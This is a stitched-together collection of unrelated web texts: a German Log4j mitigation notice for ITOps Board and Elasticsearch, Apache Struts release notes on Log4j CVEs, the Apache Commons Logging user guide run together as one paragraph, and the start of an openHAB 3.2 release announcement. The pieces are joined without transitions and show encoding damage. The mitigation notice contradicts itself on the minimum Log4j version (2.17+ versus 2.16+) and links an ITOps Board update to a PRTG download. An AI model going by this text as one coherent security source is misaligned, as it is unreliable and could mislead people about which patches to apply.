Die empfohlene Lösung ist ein Upgrade von Log4j2 auf **2.17+**. Als Vorsichtsmaßnahme sollten alle Log4j2-Versionen, die älter als 2.17 sind, als **betroffen** angesehen werden, unabhängig von der verwendeten JDK-Distribution oder Version.

## Empfohlene Lösung

Bitte updaten Sie auf version 2.11.3 von ITOps Board, welche die elastic search version 6.8.22 enthält. Alle benötigten Installationdateien finden Sie [hier.](https://downloads.paessler.com/prtg/prtg_enterprise.zip)

## Zusätzliche Empfehlungen

Um der Empfehlung von Elasticsearch nachzugehen:

1. Aktualisieren Sie auf eine JDK Version über **8** um zumindest teilweise Gegenmaßnahmen einzuleiten.
2. Befolgen Sie die Anweisungen des Herstellers Elasticsearch und aktualisieren Sie auf Elasticsearch **6.8.22**, hier kommen Sie direkt zu der Download Seite des Herstellers: [elasticsearch-6-8-22](https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-22).

Darüber hinaus können Sie die Schwachstelle auch mit einer der folgenden Schritte absichern:

1. Deaktivieren Sie *formatMessageLookup* wie folgt:
   1. Stoppen Sie den Dienst **Elasticsearch**.
   2. Fügen Sie die Zeile *-Dlog4j2.formatMsgNoLookups=true* zu dem log4j Teil unter *"C:\Program Files\Elasticsearch\elasticsearch\config\jvm.options"* hinzu.
   3. Starten Sie den Service **Elasticsearch** erneut.
2. Updaten Sie Log4j2 auf Version 2.17+ wie folgt:
   1. Laden Sie eine log4j Version über **2.17** von den Entwicklern selbst: <https://logging.apache.org/log4j/2.x/download.html>
   2. Stoppen Sie den Dienst **Elasticsearch**.
   3. Updaten Sie die Dateien **log4j-1.2-api-2.xx.y**, **log4j-api-2.xx.y**, and **log4j-core-2.xx.y** im Verzeichnis *C:\Program Files\Elasticsearch\elasticsearch\lib* und entfernen Sie Version 2.11.0.
   4. Starten Sie den Dienst **Elasticsearch** erneut.
3. **Ausschließlich** wenn die ITOpsboard-Webseite nach den Änderungen nicht korrekt aufrufbar ist:
   1. Setzen Sie die IIS Einstellungen des ITOpsboard zurück, wie [hier](https://support.martellotech.com/knowledgeBase/13171886) beschrieben.

**Update**: We raised the log4J Version for manual mitigation to 2.16+ to clarify that users should use the latest available Version, especially in regards of the second CVE-2021-45046. Customers that manually mitigated by installing Log4J Version 2.15 should consider to update to the latest version again 2.16+.

The mitigation path over the elastic search version 6.8.21 should be save, since they removed the jndi Lookups class completely according to <https://www.elastic.co/guide/en/elasticsearch/reference/6.8/release-notes-6.8.21.html>

This release addresses Log4j vulnerability [CVE-2021-45105](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45105)
by using the latest Log4j ver. 2.12.3 (Java 1.7 compatible).

**Please note, that the Apache Struts itself depends on the log4j-api package only, itâs usersâ responsibility
to use a proper version of the log4j-core package!**

> Please read the [Version Notes](https://cwiki.apache.org/confluence/display/WW/Version%2BNotes%2B2.5.28.2) to find more details about performed
> bug fixes and improvements.

Apache Struts 2 is an elegant, extensible framework for creating enterprise-ready Java web applications.
The framework has been designed to streamline the full development cycle, from building, to deploying,
to maintaining applications over time.

**All developers are strongly advised to perform this upgrade.**

The 2.5.x series of the Apache Struts framework has a minimum requirement of the following specification versions:
Servlet API 2.4, JSP API 2.0, and Java 7.

Should any issues arise with your use of any version of the Struts framework, please post your comments to the user list,
and, if appropriate, file [a tracking ticket](https://issues.apache.org/jira/projects/WW/).

You can download this version from our [download](download.cgi#struts-ga) page.

#### 17 December 2021 - Struts 2.5.28.1 General Availability

The Apache Struts group is pleased to announce that Struts 2.5.28.1 is available as a âGeneral Availabilityâ
release. The GA designation is our highest quality grade.

This release addresses Log4j vulnerability [CVE-2021-45046](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-45046)
by using the latest Log4j 2.12.2 version (Java 1.7 compatible).

#### 12 December 2021 - Security Advice on Log4j 2.15.0

The Apache Struts Security team would like to announce that all the users using the latest Struts 2.5.x series
should upgrade [Log4j](https://logging.apache.org/log4j/2.x/) library to the latest **2.15.0** version which addresses
the Remote-Code-Execution vulnerability **CVE-2021-44228**.

This version of Log4j requires Java 8, while Apache Struts 2.5.x series is still using Java 1.7 and because
of that we cannot prepare a new patched 2.5.x version. Yet, in most cases this is a drop-in upgrade as Log4j 2.15.0
maintains binary compatibility with previous releases - once you are running on Java 8. In case you are not able
to upgrade Log4j, please use one of the described mitigations.

More information can be found [here](https://logging.apache.org/log4j/2.x/#News).

**All developers are strongly advised to perform this action.**

#### 12 December 2021 - Struts 2.5.28 General Availability

[Frequently Asked Questions](#Frequently_Asked_Questions)  Introduction The Apache Commons Logging (JCL) provides a `Log` interface that is intended to be both light-weight and an independent abstraction of other logging toolkits. It provides the middleware/tooling developer with a simple logging abstraction, that allows the user (application developer) to plug in a specific logging implementation.  JCL provides thin-wrapper `Log` implementations for other logging APIs and backends, including [Log4j API](https://logging.apache.org/log4j/2.x/manual/api-separation), [SLF4J](https://www.slf4j.org) and `java.util.logging`.  **Warning:** implementations for older logging backends such as [Log4j 1.2](https://logging.apache.org/log4j/1.2/), [Avalon LogKit](https://avalon.apache.org), and [Lumberjack](https://javalogging.sourceforge.net) are also provided, although they are disabled by default.  Familiarity with high-level details of the relevant Logging implementations is presumed.  Quick Start JCL tries to be as unobtrusive as possible. In most cases, including the (full) `commons-logging.jar` in the classpath should result in JCL configuring itself in a reasonable manner. There's a good chance that it'll guess (discover) your preferred logging system, and you won't need to do any configuration of JCL at all.  Note, however, that if you have a particular preference, then providing a simple `commons-logging.properties` file which specifies the concrete logging library to be used is recommended, since (in this case) JCL will log only to that system and will report any configuration problems that prevent that system being used.  When no particular logging library is specified, then JCL will silently ignore any logging library that it finds but cannot initialize and continue to look for other alternatives. This is a deliberate design decision; no application should fail to run because a "guessed" logging library cannot be used. To ensure an exception is reported when a particular logging library cannot be used, use one of the available JCL configuration mechanisms to force that library to be selected (ie disable JCL's discovery process). Configuration There are two base abstractions used by JCL: `Log` (the basic logger) and `LogFactory` (which knows how to create `Log` instances). Specifying a particular Log implementation is very useful (whether that is one provided by Commons Logging or a user-defined one). Specifying a `LogFactory` implementation explicitly is a subject for advanced users only, so will not be addressed here.  JCL provides three standard log factories:   1. if [Log4j API](https://logging.apache.org/log4j/2.x/manual/api-separation)    is present on the classpath and it is not redirected to SLF4J, then `Log4jApiLogFactory`    is used. This factory redirects all output to Log4j API. 2. otherwise if [SLF4J](https://www.slf4j.org) is present on the classpath,    then `Slf4jLogFactory` is used. This factory redirects all output to SLF4J. 3. otherwise the legacy `LogFactoryImpl` is used.   The legacy `LogFactory` implementation uses the following discovery process to determine what type of `Log` implementation it should use (the process terminates when the first positive match - in order - is found):   1. Look for a configuration attribute of this factory named    `org.apache.commons.logging.Log` (for backwards compatibility with    pre-1.0 versions of this API, an attribute    `org.apache.commons.logging.log` is also consulted).  Configuration attributes can be set explicitly by Java code, but they are more    commonly set by placing a file named `commons-logging.properties` in the classpath.    When such a file exists, every entry in the properties file becomes an "attribute"    of the LogFactory. When there is more than one such file in the classpath, releases    of commons-logging prior to 1.1 simply use the first one found. From release 1.1,    each file may define a `priority` key, and the file with    the highest priority is used (no priority definition implies priority of zero).    When multiple files have the same priority, the first one found is used.  Defining this property in a `commons-logging.properties` file is the recommended    way of explicitly selecting a Log implementation. 2. Look for a system property named    `org.apache.commons.logging.Log` (for backwards    compatibility with pre-1.0 versions of this API, a system property    `org.apache.commons.logging.log` is also consulted). 3. If the `java.logging` module is available, use    the corresponding wrapper class    ([Jdk14Logger](https://commons.apache.org/logging/apidocs/org/apache/commons/logging/impl/Jdk14Logger.html)). 4. Fall back to the default simple logging wrapper    ([SimpleLog](https://commons.apache.org/logging/apidocs/org/apache/commons/logging/impl/SimpleLog.html)).   Consult the JCL javadocs for details of the various `Log` implementations that ship with the component. (The discovery process is also covered in more detail there.)  Configuring The Underlying Logging System The JCL SPI can be configured to use different logging toolkits (see [above](#Configuration)). JCL provides only a bridge for writing log messages. It does not (and will not) support any sort of configuration API for the underlying logging system.  Configuration of the behavior of the JCL ultimately depends upon the logging toolkit being used. Please consult the documentation for the chosen logging system.  JCL is NOT responsible for initialization, configuration, or shutdown of the underlying logging library. In many cases logging libraries will automatically initialize/configure themselves when first used, and need no explicit shutdown process. In these situations an application can simply use JCL and not depend directly on the API of the underlying logging system in any way. However if the logging library being used requires special initialization, configuration, or shutdown, then some logging-library-specific code will be required in the application. JCL simply forwards logging method calls to the correct underlying implementation. When writing library code this issue is of course not relevant as the calling application is responsible for handling such issues.   Developing With JCLObtaining a Log Object To use the JCL SPI from a Java class, include the following import statements:   `import org.apache.commons.logging.Log;  import org.apache.commons.logging.LogFactory;`  Note that some components using JCL may either extend Log, or provide a component-specific LogFactory implementation. Review the component documentation for guidelines on how commons-logging should be used in such components.  For each class definition, declare and initialize a `log` attribute as follows:    ```  public class CLASS {     private Log log = LogFactory.getLog(CLASS.class);     ...     ;          ```   Note that for application code, declaring the log member as "static" is more efficient as one Log object is created per class, and is recommended. However this is not safe to do for a class which may be deployed via a "shared" classloader in a servlet or j2ee container or similar environment. If the class may end up invoked with different thread-context-classloader values set, then the member must *not* be declared static. The use of "static" should therefore be avoided in code within any "library" type project.  Logging a Message Messages are logged to a *logger*, such as `log` by invoking a method corresponding to *priority*. The `org.apache.commons.logging.Log` interface defines the following methods for use in writing log/trace messages to the log:    ```      log.fatal(Object message);     log.fatal(Object message, Throwable t);     log.error(Object message);     log.error(Object message, Throwable t);     log.warn(Object message);     log.warn(Object message, Throwable t);     log.info(Object message);     log.info(Object message, Throwable t);     log.debug(Object message);     log.debug(Object message, Throwable t);     log.trace(Object message);     log.trace(Object message, Throwable t);          ```   Semantics for these methods are such that it is expected that the severity, from highest to lowest, of messages is ordered as above.  In addition to the logging methods, the following are provided for code guards:    ```      log.isFatalEnabled();     log.isErrorEnabled();     log.isWarnEnabled();     log.isInfoEnabled();     log.isDebugEnabled();     log.isTraceEnabled();          ```  Serialization Issues Prior to release 1.0.4, none of the standard Log implementations were Serializable. If you are using such a release and have a Serializable class with a member that is of type Log, then it is necessary to declare that member to be transient and to ensure that the value is restored on deserialization. The recommended approach is to define a custom readObject method on the class which reinitializes that member.  In release 1.0.4, all standard Log implementations are Serializable. This means that class members of type Log do *not* need to be declared transient; on deserialization the Log object will "rebind" to the same category for the same logging library. Note that the same underlying logging library will be used on deserialization as was used in the original object, even if the application the object was deserialized into is using a different logging library. There is one exception; LogKitLogger (adapter for the Avalon LogKit library) is not Serializable for technical reasons.  Custom Log implementations not distributed with commons-logging may or may not be Serializable. If you wish your code to be compatible with any arbitrary log adapter, then you should follow the advice given above for pre-1.0.4 releases.   Jars Included in the Standard Distributioncommons-logging.jar The `commons-logging.jar` file includes the JCL API, the default `LogFactory` implementation and thin-wrapper `Log` implementations for [Log4J](https://logging.apache.org/log4j/docs/index.html), [Avalon LogKit](https://avalon.apache.org/logkit/index.html), the Avalon Framework's logging infrastructure, java.util.logging, as well as an implementation of java.util.logging APIs (JSR-47) for pre-1.4 systems.  In most cases, including `commons-logging.jar` and your preferred logging implementation in the classpath should be all that is required to use JCL.  commons-logging-api.jar The `commons-logging-api.jar` file includes the JCL API and the default `LogFactory` implementation as well as the built-in `Log` implementations SimpleLog and NoOpLog. However it does not include the wrapper `Log` implementations that require additional libraries such as `Log4j`, `Avalon` and `Lumberjack`.  This jar is intended for use by projects that recompile the commons-logging source using alternate java environments, and cannot compile against all of the optional libraries that the Apache release of commons-logging supports. Because of the reduced dependencies of this jarfile, such projects should be able to create an equivalent of this library with fewer difficulties.  This jar is also useful for build environments that automatically track dependencies, and thus have difficulty with the concept that the main commons-logging.jar has "optional" dependencies on various logging implementations that can safely go unsatisfied at runtime.  commons-logging-adapters.jar The `commons-logging-adapters.jar` file includes only adapters to third-party logging implementations, and none of the core commons-logging framework. As such, it cannot be used alone; either commons-logging.jar or commons-logging-api.jar must also be present in the classpath.  This library will not often be used; it is only intended for situations where a container has deployed commons-logging-api.jar in a shared classpath but a webapp wants to bind logging to one of the external logging implementations that the api jar does not include. In this situation, deploying the commons-logging.jar file within the webapp can cause problems as this leads to duplicates of the core commons-logging classes (Log, LogFactory, etc) in the classpath which in turn can cause unpleasant ClassCastException exceptions to occur. Deploying only the adapters avoids this problem.   JCL Best Practices Best practices for JCL are presented in two categories: General and Enterprise. The general principles are fairly clear.Enterprise practices are a bit more involved and it is not always as clear as to why they are important.  Enterprise best-practice principles apply to middleware components and tooling that is expected to execute in an "Enterprise" level environment. These issues relate to Logging as Internationalization, and fault detection. Enterprise requires more effort and planning, but are strongly encouraged (if not required) in production level systems. Different corporate enterprises/environments have different requirements, so being flexible always helps.  Best Practices (General)Code Guards Code guards are typically used to guard code that only needs to execute in support of logging, that otherwise introduces undesirable runtime overhead in the general case (logging disabled). Examples are multiple parameters, or expressions (e.g. string + " more") for parameters. Use the guard methods of the form `log.is<Priority>()` to verify that logging should be performed, before incurring the overhead of the logging method call. Yes, the logging methods will perform the same check, but only after resolving parameters.  Message Priorities/Levels It is important to ensure that log message are appropriate in content and severity. The following guidelines are suggested:   * **fatal** - Severe errors that cause premature termination.   Expect these to be immediately visible on a status console.   See also   Internationalization. * **error** - Other runtime errors or unexpected conditions.   Expect these to be immediately visible on a status console.   See also   Internationalization. * **warn** - Use of deprecated APIs, poor use of API, 'almost' errors,   other runtime situations that are undesirable or unexpected, but not   necessarily "wrong".   Expect these to be immediately visible on a status console.   See also   Internationalization. * **info** - Interesting runtime events (startup/shutdown).   Expect these to be immediately visible on a console,   so be conservative and keep to a minimum.   See also   Internationalization. * **debug** - detailed information on the flow through the system.   Expect these to be written to logs only. * **trace** - more detailed information.   Expect these to be written to logs only.  Default Message Priority/Level By default the message priority should be no lower than **info**. That is, by default **debug** message should not be seen in the logs.   Best Practices (Enterprise)Logging Exceptions The general rule in dealing with exceptions is to assume that the user (developer using a tooling/middleware API) isn't going to follow the rules. Since any problems that result are going to be assigned to you, it's in your best interest to be prepared with the proactive tools necessary to demonstrate that your component works correctly, or at worst that the problem can be analyzed from your logs. For this discussion, we must make a distinction between different types of exceptions based on what kind of boundaries they cross:   * **External Boundaries - Expected Exceptions**.   This classification includes exceptions such as `FileNotFoundException`   that cross API/SPI boundaries, and are exposed to the user of a component/toolkit.   These are listed in the 'throws' clause of a method signature.      Appropriate handling of these exceptions depends upon the type   of code you are developing.   API's for utility functions and tools should log these at the **debug** level,   if they are caught at all by internal code.      For higher level frameworks and middleware components,   these exceptions should be caught immediately prior to crossing   the API/SPI interface back to user code-space,   logged with full stack trace at **info** level,   and rethrown.   The assures that the log contains a record of the root cause for   future analysis *in the event that the exception is not caught and resolved   as expected by the user's code*. * **External Boundaries - Unexpected Exceptions**.   This classification includes exceptions such as `NullPointerException`   that cross API/SPI boundaries, and are exposed to the user of a component/toolkit.   These are runtime exceptions/error that are NOT   listed in the 'throws' clause of a method signature.      Appropriate handling of these exceptions depends upon the type   of code you are developing.   APIs for utility functions and tools should log these at the **debug** level,   if they are caught at all.      For higher level frameworks and middleware components,   these exceptions should be caught immediately prior to crossing   the API/SPI interface back to user code-space,   logged with full stack trace at **info** level,   and rethrown/wrapped as `ComponentInternalError`.   This ensures that the log contains a record of the root cause for   future analysis *in the event that the exception is not caught and   logged/reported as expected by the user's code*. * **Internal Boundaries**.   Exceptions that occur internally and are resolved internally.   These should be logged when caught as **debug** or **info** messages,   at the programmer's discretion. * **Significant Internal Boundaries**.   This typically only applies to middleware components that span networks or runtime processes.   Exceptions that cross over significant internal component boundaries such as networks   should be logged when caught as **info** messages.   Do not assume that such a (process/network) boundary will deliver exceptions to the 'other side'.  When Info Level Instead of Debug? You want to have exception/problem information available for first-pass problem determination in a production level enterprise application without turning on **debug** as a default log level. There is simply too much information in **debug** to be appropriate for day-to-day operations.  More Control of Enterprise Exception Logging If more control is desired for the level of detail of these 'enterprise' exceptions, then consider creating a special logger just for these exceptions:    ```     Log log = LogFactory.getLog("org.apache.component.enterprise");  ```   This allows the 'enterprise' level information to be turned on/off explicitly by most logger implementations.  National Language Support And Internationalization NLS internationalization involves looking up messages from a message file by a message key, and using that message for logging. There are various tools in Java, and provided by other components, for working with NLS messages.  NLS enabled components are particularly appreciated (that's an open-source-correct term for 'required by corporate end-users' :-) for **tooling** and **middleware** components.  NLS internationalization SHOULD be strongly considered for used for **fatal**, **error**, **warn**, and **info** messages. It is generally considered optional for **debug** and **trace** messages.  Perhaps more direct support for internationalizing log messages can be introduced in a future or alternate version of the `Log` interface.  Classloader and Memory Management The `LogFactory` discovery process (see [Configuration](#Configuration) above) is a fairly expensive operation, so JCL certainly should not perform it each time user code invokes:  ``` LogFactory.getLog() ```  Instead JCL caches the `LogFactory` implementation created as a result of the discovery process and uses the cached factory to return `Log` objects. Since in JEE and similar multi-classloader environments, the result of the discovery process can vary depending on the thread context classloader (e.g. one webapp in a web container may be configured to use Log4j and another to use java.util.logging), JCL internally caches the `LogFactory` instances in a static hashtable, keyed by classloader.  While this approach is efficient, it can lead to memory leaks if container implementors are not careful to call  ``` LogFactory.release() ```  whenever a classloader that has utilized JCL is undeployed. If `release()` is not called, a reference to the undeployed classloader (and thus to all the classes loaded by it) will be held in `LogFactory`'s static hashtable.  `LogFactory` caches factory implementations in a "WeakHashtable". This class is similar to `java.util.WeakHashMap` in that it holds a `WeakReference` to each key (but a strong reference to each value), thus allowing classloaders to be GC'd even if `LogFactory.release()` is never invoked.  If a custom LogFactory implementation is used, however, then a `WeakHashtable` alone can be insufficient to allow garbage collection of a classloader without a call to `release`. If the abstract class `LogFactory` is loaded by a parent classloader and a concrete subclass implementation of `LogFactory` is loaded by a child classloader, the WeakHashtable's key is a weak reference to the TCCL (child classloader), but the value is a strong reference to the LogFactory instance, which in turn contains a strong reference to its class and thus loading classloader - the child classloader. This chain of strong references prevents the child loader from being garbage collected.  If use of a custom `LogFactory` subclass is desired, ensuring that the custom subclass is loaded by the same classloader as `LogFactory` will prevent problems. In normal deployments, the standard implementations of `LogFactory` found in package `org.apache.commons.logging.impl` will be loaded by the same classloader that loads `LogFactory` itself, so use of the standard `LogFactory` implementation should not pose problems. Alternatively, use the provided ServletContextCleaner to ensure this reference is explicitly released on webapp unload.   Extending Commons Logging JCL is designed to encourage extensions to be created that add functionality. Typically, extensions to JCL fall into two categories:   * new `Log` implementations that provide new bridges to logging systems * new `LogFactory` implementations that provide alternative discovery strategies  Contract When creating new implementations for `Log` and `LogFactory`, it is important to understand the implied contract between the factory and the log implementations:   * **Life cycle** The JCL LogFactory implementation must assume responsibility for   either connecting/disconnecting to a logging toolkit,   or instantiating/initializing/destroying a logging toolkit. * **Exception handling** The JCL Log interface doesn't specify any exceptions to be handled,   the implementation must catch any exceptions. * **Multiple threads** The JCL Log and LogFactory implementations must ensure   that any synchronization required by the logging toolkit   is met.  Creating a Log Implementation The minimum requirement to integrate with another logger is to provide an implementation of the `org.apache.commons.logging.Log` interface. In addition, an implementation of the `org.apache.commons.logging.LogFactory` interface can be provided to meet specific requirements for connecting to, or instantiating, a logger.  The default `LogFactory` provided by JCL can be configured to instantiate a specific implementation of the `org.apache.commons.logging.Log` interface by setting the property of the same name (`org.apache.commons.logging.Log`). This property can be specified as a system property, or in the `commons-logging.properties` file, which must exist in the CLASSPATH.  Creating A LogFactory Implementation If desired, the default implementation of the `org.apache.commons.logging.LogFactory` interface can be overridden, allowing the JDK 1.3 Service Provider discovery process to locate and create a LogFactory specific to the needs of the application. Review the Javadoc for the `LogFactoryImpl.java` for details.   A Quick Guide To Simple Log JCL is distributed with a very simple `Log` implementation named `org.apache.commons.logging.impl.SimpleLog`. This is intended to be a minimal implementation. Developers requiring a fully functional open source logging system are directed to [Log4J](https://logging.apache.org/log4j).  `SimpleLog` sends all (enabled) log messages, for all defined loggers, to `System.err`. The following system properties are supported to configure the behavior of this logger:   * **org.apache.commons.logging.simplelog.defaultlog** -   Default logging detail level for all instances of SimpleLog.   Must be one of:   + `trace`   + `debug`   + `info`   + `warn`   + `error`   + `fatal`If not specified, defaults to `info`. * **org.apache.commons.logging.simplelog.log.xxxxx** -   Logging detail level for a SimpleLog instance named "xxxxx".   Must be one of:   + `trace`   + `debug`   + `info`   + `warn`   + `error`   + `fatal`If not specified, the default logging detail level is used. * **org.apache.commons.logging.simplelog.showlogname** -   Set to `true` if you want the `Log` instance name to be   included in output messages. Defaults to `false`. * **org.apache.commons.logging.simplelog.showShortLogname** -   Set to `true` if you want the last component of the name to be   included in output messages. Defaults to `true`. * **org.apache.commons.logging.simplelog.showdatetime** -   Set to `true` if you want the current date and time   to be included in output messages. Default is `false`. * **org.apache.commons.logging.simplelog.dateTimeFormat** -   The date and time format to be used in the output messages.   The pattern describing the date and time format is the same that is   used in `java.text.SimpleDateFormat`. If the format is not   specified or is invalid, the default format is used.   The default format is `yyyy/MM/dd HH:mm:ss:SSS zzz`.   In addition to looking for system properties with the names specified above, this implementation also checks for a class loader resource named `"simplelog.properties"`, and includes any matching definitions from this resource (if it exists).

# openHAB 3.2 Release

 **Kai Kreuzer and others** posted on Monday, 20 December 2021

Our winter release of openHAB 3.2 is out! This latest version contains many new add-ons, enhanced voice features, automation improvements and more!

Another year is coming to its end and so it is time for us to bring you this openHAB release just in time for the festive season!

In the recent days and weeks the IT industry has been dealing with the fallout from vulnerabilities found in the log4j library, aka Log4Shell - prompting around the clock remediation efforts by developers and other IT professionals, especially those who operate Java based systems.

As openHAB is based on Java, we were impacted as well. To ensure we are protecting our users and community, we have addressed the major risks through the [3.0.4 and 3.1.1 patch releases  (opens new window)](https://community.openhab.org/t/openhab-and-the-log4j-security-vulnerability/129901/2) that were published shortly after the fixed log4j 2.15 was out. Looking at the statistics of Maven Central that are provided by Sonatype, we have been ahead of many in the general industry, while at least 50% are still consuming vulnerable log4j versions < 2.15:

![](/uploads/2021-12-20-log4jstats.png)

Since log4j 2.15 has been released, many security researchers have focused on testing this new version, and in consequence further (partially less critical) issues were found that led to the latest log4j versions 2.16 and 2.17 being released. We are happy to tell you that openHAB 3.2 already contains the (as of writing) very latest version 2.17, which should give our users a good reason to update their installations.

This dramatic log4j story has shed light on a larger issue we have in our industry: Open Source maintenance is often only done by engaged individuals in their spare time and their work is rarely recognized by the people that depend on such libraries. In the case of log4j, two passionate developers are taking care of the project in their free time, while nearly the entire Java industry depends on it. These people do a tremendous job and they hopefully get the recognition (and sponsors from the industry) they deserve.

Having said this, I would like to also make sure that our openHAB committers are recognized for their work. While I often do the announcements, I don't contribute to the code base that much anymore - the major work is on the shoulders of many individuals that - most of the time silently - keep coding and contributing to our common project. I therefore like to thank every contributor, especially the ones of the [18 new add-ons  (opens new window)](https://github.com/openhab/openhab-distro/releases/tag/3.2.0#newaddons) that are included in the 3.2 release and would now like to give the word directly to some of our maintainers that worked on outstanding new features:

## [#](#rule-engine-enhancements) Rule Engine Enhancements

*Dan Cunningham, openHAB Maintainer*

In the very early days of openHAB, the rules “DSL” was the only standard for writing custom rules. This Java-like scripting language is based on Xtend and is still used widely today due to its stability and powerful built-in functionality. Over time however, the underlying rule infrastructure has matured allowing additional script engines to coexist to provide a true polyglot scripting environment. openHAB 3.2 ships with multiple script engines including [JRuby  (opens new window)](https://www.openhab.org/addons/automation/jrubyscripting/), [Jython  (opens new window)](https://www.openhab.org/addons/automation/jythonscripting/), [Groovy  (opens new window)](https://www.openhab.org/addons/automation/groovyscripting/), and a ECMAScript 2021 compatible Javascript environment, [JS Scripting  (opens new window)](https://www.openhab.org/addons/automation/jsscripting/).

![](/uploads/2021-12-20-rule-engines.png)

### [#](#javascript-script-engine) Javascript Script Engine

In openHAB 3.2 we are proud to announce a greatly enhanced version of the GraalVM based JavaScript engine, [JS Scripting  (opens new window)](https://www.openhab.org/addons/automation/jsscripting/), which brings the same ease of use and powerful built-in library of the Rules DSL, but in a modern [ES2021 version  (opens new window)](https://en.wikipedia.org/wiki/ECMAScript#Versions) of JavaScript that will be familiar to power users and novices alike. The enhanced JS Scripting add-on brings together several existing projects into a single, easy to use automation environment.

Included in this add-on by default is the new [*openhab-js*  (opens new window)](https://github.com/openhab/openhab-js) JavaScript library, a fairly high-level ES6 library that provides convenient access to common openHAB functionality including items, things, actions, caches, time functionality, logging and more. As this library is included in all scripts by default, writing rules is as simple as

```
items.getItem("KitchenLight").sendCommand("ON");

```

No imports, using `require()` or calling out to Java native types needed! Even better, the openHAB 3 UI includes support for the [*openhab-js*  (opens new window)](https://github.com/openhab/openhab-js) API and offers hinting and autocomplete when editing scripts.

![](/uploads/2021-rules-script-editor.gif)

This behavior is configurable, and users can opt to disable automatic imports into scripts for full control of their scripting environment. Users can continue to use custom built libraries as well as NPM modules through the use of CommonJS Require. Best of all, [*openhab-js*  (opens new window)](https://github.com/openhab/openhab-js) is published as an NPM library, [*openhab*  (opens new window)](https://www.npmjs.com/package/openhab) and can be updated or modified by users independently of the built-in version by running `npm -i openhab` inside the user’s JS automation configuration folder.

The JS Scripting binding also now includes standard built in global features that users coming from modern JavaScript environments expect to have. This includes full support of [console logging  (opens new window)](https://developer.mozilla.org/en-US/docs/Web/API/Console/log) to the main openHAB log (including debug, trace, info, etc.), timer support with [`setTimeout()`  (opens new window)](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout) and [`setInterval()`  (opens new window)](https://developer.mozilla.org/en-US/docs/Web/API/setInterval) , and importing personal or NPM published packages with `require()`. For example, logging in rules is as easy as:

```
console.log("Kitchen Light State", items.getItem("KitchenLight").state);

```

Finally, in previous openHAB versions, installing the JS Scripting binding meant the legacy default Javascript ES5 engine (Nashorn) could not be used. In practice the two engines had issues coexisting, especially when it comes to UI based rules. In openHAB 3.2, JS Scripting will use its own directory for files in `conf/automation/js`, including user provided libraries. The UI will now show both scripting engines when selecting an action, allowing the user to continue to use the legacy JavaScript engine, or migrate to this new ES2021 based version at their convenience.

Thank you to Jonathan Gilbert (aka jpg0), who contributed both the JSScripting add-on as well as the *openhab-js* library.

## [#](#marketplace-and-new-visual-automation-possibilities) Marketplace and New Visual Automation Possibilities

*Yannick Schaus, openHAB Maintainer*

If you're a regular visitor of the openHAB community forum, you might have noticed it already: there's a new [Add-on Marketplace  (opens new window)](https://community.openhab.org/c/marketplace/69) section where our users can come and share their work. We made the choice to keep it self-moderated ([albeit regulated  (opens new window)](https://community.openhab.org/t/about-the-add-on-marketplace-category/123408)) by our regular visitors who after reaching a certain trust level, automatically earn curating privileges. Thanks to the associated add-on service, by merely opening a new topic in this category, everyone can effectively publish an add-on that will be featured and installable with a simple click of a button, right from the new add-on store in the openHAB UI. No copy-pasting or putting a .jar file in the addons folder involved!

![](/uploads/addonstore_32_example.png)

In the add-on store, you'll find both the trusted add-ons that come with the openHAB distribution (those are clearly identifiable with "openHAB" and a "verified" check mark) alongside community contributions from the marketplace - which allowed to expand what is commonly considered an add-on. You can not only find unofficial bindings and other Java-based extensions, or updates to existing ones (before they hopefully make their way to the distribution), but also new content like UI widgets, as well as rule templates and block libraries that help you with common automation tasks that have been previously solved, and which you can simply learn and profit from instead of reinventing the wheel.

**Rule Templates** have actually existed since openHAB 2 but never became quite useable enough to gain momentum; now they're back with a vengeance to allow creating new rules in seconds, complete with triggers, conditions and actions, including pre-written scripts, just by filling a form to adjust some parameters to your specific configuration. Afterwards you can review what was created and adjust as needed like any other rule. You'll find the add-on store already [well stocked  (opens new window)](https://community.openhab.org/c/marketplace/rule-templates/74) with high quality rule templates (mostly) by Rich Koshak, who also notably wrote the design patterns series of articles on the forum. He has also written a [how-to  (opens new window)](https://community.openhab.org/t/how-to-write-a-rule-template/128309) on rule templates so more people can join him and contribute.

![](/uploads/ruletemplate_32_example.png)

Authoring scripts with Blockly is now open to completely new possibilities: first of all, massive improvements have been made to the built-in openHAB block types offering - kudos to Stefan Höhn for this initiative! From a measly 5 openHAB-related block types in openHAB 3.1, the Blockly toolbox now features no less than 45 of them, organized in 9 categories covering everything from timers, voice and multimedia, to notifications, persistence and more. And while Blockly still uses the default legacy Nashorn ES5 engine under the hood waiting for its replacement showcased above by Dan to mature, its future is bright because it will eventually make the switch once it becomes the default, and leverage all the new features that are coming with it, notably the standard *openhab-js* library or importing NPM packages.

But that's not all, because you can now also extend Blockly almost limitlessly by writing your own **Block Libraries** that can solve domain-specific or esoteric use cases, and generate reference code that can be reused as easily as dragging a block from the toolbox and configuring it.
And of course there's a [subcategory  (opens new window)](https://community.openhab.org/c/marketplace/block-libraries/76) in the Add-on Marketplace to share your block libraries with others, who can install them based on their needs.

![](/uploads/blockly_32_example.png)

Follow [this tutorial  (opens new window)](https://openhab.org/link/blocklib-tutorial) to learn how to write block libraries. There are a few of them already waiting to be installed from the add-on store, like one to use the new [Twitter binding](/addons/bindings/twitter/)!

In these new visual automation features, there's something for everyone: novices can assemble blocks or create rules from templates, and then study how it was made; but it can appeal to veterans as well from a practical point of view.

## [#](#openhab-skill-for-amazon-alexa) openHAB Skill for Amazon Alexa

*Jeremy Setton, openHAB Maintainer*

A complete rework of the openHAB skill for Amazon Alexa has been released. It introduces a new device-centric metadata syntax in line with the other voice assistant integrations, and simplifies the configuration of basic functionalities while staying backward compatible to ease the transition.

The new metadata syntax acts as a new layer on top of the previous API capability-centric syntax, giving the ability to create new custom pre-configured capabilities that aren’t supported natively by the Alexa Smart Home API yet.

The new skill includes new capabilities for camera, door/window covering, fan, networking and vacuum devices and updates for security panel and thermostat devices.

Additionally, a much improved Main UI integration supporting the new metadata syntax is included in openHAB 3.2. It provides a much better visibility across group endpoints, and tailors the configuration based on item properties and metadata parameters.

![](/uploads/2021-12-20-alexa-ui.gif)

The [latest documentation  (opens new window)](https://www.openhab.org/docs/ecosystem/alexa/) provides all the necessary information and examples to take advantage of the new syntax.

## [#](#localizing-add-ons) Localizing Add-ons

*Christoph Weitkamp, openHAB Maintainer*

